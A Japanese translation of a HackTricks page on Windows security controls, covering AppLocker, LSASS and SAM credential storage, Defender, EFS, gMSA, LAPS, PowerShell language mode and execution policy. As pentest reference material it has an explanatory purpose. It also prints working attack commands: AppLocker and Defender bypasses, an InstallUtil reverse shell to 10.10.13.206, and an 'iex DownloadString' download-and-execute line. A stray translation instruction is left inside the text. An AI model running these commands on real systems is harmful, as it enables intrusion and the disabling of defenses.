# Windows セキュリティコントロール

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告掲載したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングテクニックを共有する。

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) を使用して、世界で最も進んだコミュニティツールによって動力を供給される **ワークフローを簡単に構築し自動化する**。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker ポリシー

アプリケーションホワイトリストは、システム上に存在し実行が許可されている承認済みソフトウェアアプリケーションまたは実行可能ファイルのリストです。目的は、組織の特定のビジネスニーズに合致しない有害なマルウェアや承認されていないソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者が **ユーザーが実行できるアプリケーションとファイルを制御する** 機能を提供します。実行可能ファイル、スクリプト、Windows インストーラーファイル、DLL、パッケージアプリ、パックされたアプリインストーラーに対する **細かい制御** を提供します。\
組織では **cmd.exe や PowerShell.exe をブロックし**、特定のディレクトリへの書き込みアクセスを制限することが一般的ですが、**これはすべてバイパス可能です**。

### チェック

ブラックリスト/ホワイトリストに登録されているファイル/拡張子を確認する：
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
AppLockerのルールは、ホストに適用されたものも**ローカルレジストリから読み取ることができます**。その場所は**`HKLM\Software\Policies\Microsoft\Windows\SrpV2`**です。

### バイパス

* AppLockerポリシーをバイパスするための便利な**書き込み可能なフォルダー**: AppLockerが`C:\Windows\System32`や`C:\Windows`内の任意の実行を許可している場合、**書き込み可能なフォルダー**を使用して**これをバイパスする**ことができます。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* 一般的に**信頼されている**[**"LOLBAS's"**](https://lolbas-project.github.io/)バイナリはAppLockerをバイパスするのにも役立ちます。
* **不十分に書かれたルールもバイパス可能です**
* 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**では、どこかに**`allowed`というフォルダを作成する**と、それが許可されます。
* 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行ファイルのブロック**に注力しますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`などの**他の**[**PowerShell実行ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)を忘れがちです。
* **DLLの強制はほとんど有効にされていません**。システムにかかる追加負荷と、何も壊れないことを保証するために必要なテストの量のためです。したがって、**DLLをバックドアとして使用するとAppLockerをバイパスできます**。
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、任意のプロセスでPowershellコードを**実行し**、AppLockerをバイパスできます。詳細はこちらをチェックしてください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## 資格情報の保存

### セキュリティアカウントマネージャー (SAM)

ローカルの資格情報がこのファイルに存在し、パスワードはハッシュ化されています。

### ローカルセキュリティ権限 (LSA) - LSASS

**資格情報**（ハッシュ化されたもの）は、シングルサインオンのためにこのサブシステムの**メモリ**に**保存**されます。\
**LSA**はローカルの**セキュリティポリシー**（パスワードポリシー、ユーザー権限など）、**認証**、**アクセストークン**などを管理します。\
LSAは、ローカルログインのために提供された資格情報を**SAM**ファイル内で**確認**し、ドメインユーザーを認証するために**ドメインコントローラー**と**通信**します。

**資格情報**は**LSASSプロセス**内に**保存**されます：Kerberosチケット、NTとLMのハッシュ、簡単に復号化されるパスワード。

### LSAシークレット

LSAはディスク上にいくつかの資格情報を保存することがあります：

* アクティブディレクトリのコンピュータアカウントのパスワード（到達不能なドメインコントローラー）。
* Windowsサービスのアカウントのパスワード
* スケジュールされたタスクのパスワード
* その他（IISアプリケーションのパスワードなど）

### NTDS.dit

これはアクティブディレクトリのデータベースです。ドメインコントローラーにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)はWindows 10とWindows 11、およびWindows Serverのバージョンで利用可能なアンチウイルスです。**`WinPEAS`**などの一般的なペネトレーションテストツールを**ブロック**します。しかし、これらの保護を**バイパスする方法**があります。

### チェック

**Defender**の**状態**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行します（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知る）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (暗号化ファイルシステム)

EFSは、**対称鍵**を使ってファイルを暗号化します。これはファイル暗号化キー、または**FEK**としても知られています。FEKは、ファイルを暗号化したユーザーに関連付けられた**公開鍵**で**暗号化**され、この暗号化されたFEKは暗号化されたファイルの$EFS **代替データストリーム**に格納されます。ファイルを復号するために、EFSコンポーネントドライバは、ファイルを暗号化するために使用されたEFSデジタル証明書に対応する**秘密鍵**を使用して、$EFSストリームに格納された対称鍵を復号します。[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)から。

ユーザーが要求していないにも関わらず、ファイルが復号される例：

* ファイルやフォルダは、[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のような別のファイルシステムでフォーマットされたボリュームにコピーされる前に復号されます。
* 暗号化されたファイルがSMB/CIFSプロトコルを使用してネットワーク経由でコピーされる場合、ファイルはネットワークを介して送信される前に復号されます。

この方法を使用して暗号化されたファイルは、所有者ユーザー（それを暗号化した人）によって**透過的にアクセス**できます。したがって、そのユーザーに**なることができれば**、ファイルを復号できます（ユーザーのパスワードを変更してログインしても機能しません）。

### EFS情報を確認する

この**サービス**を**使用**した**ユーザー**がいるかどうかを確認するには、このパスが存在するかどうかを確認します：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

ファイルに**アクセス**できる**人**を確認するには、cipher /c \<file>\ を使用します。
また、フォルダ内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**暗号化**および**復号化**することもできます。

### EFSファイルを復号化する

#### 権限システムである場合

この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter` セッションを使用して、ユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`を使用）。または、ユーザーのプロセスに`migrate`することもできます。

#### ユーザーのパスワードを知っている場合

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## グループ管理サービスアカウント (gMSA)

ほとんどのインフラストラクチャでは、サービスアカウントは「**パスワードの期限切れなし**」オプションを持つ典型的なユーザーアカウントです。これらのアカウントを管理することは本当に大変な作業であり、そのためにMicrosoftは**管理サービスアカウント**を導入しました：

* パスワード管理は不要です。240文字の複雑でランダムなパスワードを使用し、ドメインまたはコンピュータのパスワードの有効期限に達すると自動的に変更されます。
* Microsoft Key Distribution Service (KDC)を使用してgMSAのパスワードを作成および管理します。
* ロックアウトされることはなく、対話型ログインには使用できません
* 複数のホストで共有をサポートします
* スケジュールされたタスクの実行に使用できます（管理サービスアカウントはスケジュールされたタスクの実行をサポートしていません）
* SPN管理の簡素化 - システムは、コンピュータの**sAMaccount**の詳細やDNS名のプロパティが変更された場合に自動的にSPN値を変更します。

gMSAアカウントは、_**msDS-ManagedPassword**_ というLDAPプロパティにパスワードが格納されており、DCによって30日ごとに**自動的にリセット**され、**承認された管理者**とそれらがインストールされている**サーバー**によって**取得可能**です。_**msDS-ManagedPassword**_ は [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) と呼ばれる暗号化されたデータブロブであり、接続がLDAPSで保護されている場合、または認証タイプが「シーリング＆セキュア」の場合にのみ取得可能です。

![Image from https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

したがって、gMSAが使用されている場合、それが**特別な権限**を持っているかどうかを確認し、サービスのパスワードを**読む**ための**権限**があるかどうかも確認してください。

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)を使用してこのパスワードを読むことができます：
```
/GMSAPasswordReader --AccountName jkohler
```
以下は、**NTLMリレー攻撃**を使用して**gMSA**の**パスワード**を**読み取る**方法についての[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)を確認してください。

## LAPS

[**ローカル管理者パスワードソリューション（LAPS）**](https://www.microsoft.com/en-us/download/details.aspx?id=46899)は、ドメイン参加コンピュータ上のローカル管理者パスワード（**ランダム化**され、ユニークで、定期的に**変更される**）を**管理する**ことを可能にします。これらのパスワードはActive Directoryに中央集権的に格納され、ACLを使用して承認されたユーザーに制限されます。十分な権限が与えられた場合、ローカル管理者のパスワードを読み取ることができるかもしれません。

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS 制約言語モード

PowerShellの[**制約言語モード**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限します**。

### **チェック**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### バイパス
```powershell
#Easy bypass
Powershell -version 2
```
現在のWindowsではそのBypassは機能しませんが、[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)を使用できます。\
**コンパイルするには** _**参照を追加**_ -> _参照_ -> _参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを.Net4.5に変更する必要があります**。

#### 直接バイパス：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### リバースシェル：
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
以下は、Windowsの強化に関するハッキング技術についてのハッキング書籍の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) や [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセスで **Powershell** コードを実行し、制約モードをバイパスすることができます。詳細はこちらをチェックしてください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS 実行ポリシー

デフォルトでは **restricted** に設定されています。このポリシーをバイパスする主な方法：
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
以下に詳細があります[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## セキュリティサポートプロバイダインターフェース (SSPI)

ユーザーを認証するために使用できるAPIです。

SSPIは、通信を希望する2台のマシンに適切なプロトコルを見つける責任があります。このための優先的な方法はKerberosです。次に、SSPIは使用される認証プロトコルを交渉します。これらの認証プロトコルはセキュリティサポートプロバイダ(SSP)と呼ばれ、各Windowsマシン内にDLLの形で存在し、両方のマシンが同じものをサポートしていなければ通信することができません。

### 主なSSP

* **Kerberos**: 優先されるもの
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** と **NTLMv2**: 互換性のため
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: WebサーバーとLDAP、MD5ハッシュ形式のパスワード
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSLとTLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: 使用するプロトコル（KerberosまたはNTLM、デフォルトはKerberos）を交渉するために使用されます
* %windir%\Windows\System32\lsasrv.dll

#### 交渉では複数の方法または1つの方法のみが提供されることがあります。

## UAC - ユーザーアカウント制御

[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動に対する同意プロンプトを有効にする**機能です。

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールによって動力を得た**ワークフローを簡単に構築し自動化**します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS hackingをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有してください**。

</details>
